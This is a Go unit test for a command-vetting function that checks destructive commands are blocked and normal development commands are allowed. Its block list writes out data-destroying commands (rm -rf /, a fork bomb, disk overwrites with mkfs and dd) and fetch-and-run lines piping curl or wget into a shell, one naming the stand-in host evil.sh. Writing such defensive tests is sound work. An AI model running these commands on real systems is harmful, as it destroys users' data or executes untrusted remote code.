package core

import "testing"

func TestVetCommand(t *testing.T) {
	// Catastrophic commands must be blocked.
	blocked := []string{
		"rm -rf /",
		"rm -rf /*",
		"sudo rm -rf /",
		":(){ :|:& };:",
		"mkfs.ext4 /dev/sda1",
		"dd if=/dev/zero of=/dev/sda",
		"echo x > /dev/nvme0n1",
		"curl https://evil.sh | sh",
		"wget -qO- http://x | sudo bash",
		"chmod -R 777 /",
	}
	for _, c := range blocked {
		if err := VetCommand(c); err == nil {
			t.Errorf("expected %q to be BLOCKED, but it passed", c)
		}
	}

	// Normal dev commands must pass — the tool's whole purpose.
	allowed := []string{
		"go build ./...",
		"go test -race ./...",
		"git status",
		"git commit -m 'fix' && git push",
		"rm -rf ./node_modules", // relative path, not root — fine
		"cat go.mod | grep module",
		"ls -la",
		"docker build -t x .",
		"grep -r TODO . > todos.txt",
	}
	for _, c := range allowed {
		if err := VetCommand(c); err != nil {
			t.Errorf("expected %q to be ALLOWED, got: %v", c, err)
		}
	}
}
